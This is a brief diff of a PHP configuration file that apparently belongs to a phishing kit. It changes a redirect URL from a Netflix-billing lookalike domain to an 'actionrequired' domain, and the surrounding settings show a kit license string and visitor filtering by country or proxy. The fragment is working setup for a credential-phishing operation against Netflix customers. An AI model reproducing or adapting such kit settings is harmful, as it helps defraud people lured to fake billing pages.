@@ -57,7 +57,7 @@ if (isset($_GET["check"]))
 
 $license = "Houss-1987";
 
-$redirect = "https://billing-netflix.netsons.org/images";
+$redirect = "https://actionrequired.netsons.org/get";
 
 $parameter = 2; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple
 $wordpress = true; // Allow Wordpress Include
